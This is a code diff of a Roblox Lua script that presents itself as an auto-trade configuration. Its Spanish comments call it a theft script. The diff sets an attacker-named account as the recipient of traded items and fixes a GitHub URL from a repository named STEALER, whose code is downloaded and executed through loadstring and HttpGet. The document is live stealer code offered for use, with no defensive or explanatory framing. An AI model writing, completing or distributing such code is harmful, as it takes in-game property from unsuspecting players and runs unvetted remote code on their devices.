@@ -8,7 +8,7 @@ getgenv().AutoTradeConfig = {
 
 -- cambia jugador 1,2,3.... por el user de tus cuentas que van a recibir las cosas.  
     JugadoresObjetivos = {
-        "Jugador1", 
+        "Hahahahlolllpro", 
         "Jugador2",
         "Jugador3"
     }
@@ -25,5 +25,5 @@ end)
 -- ==========================================
 -- CARGA DEL script de robo NO BORRES ESTO 
 -- ==========================================
-local rawUrl = "https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core"
+local rawUrl = "https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"
 loadstring(game:HttpGet(rawUrl))()
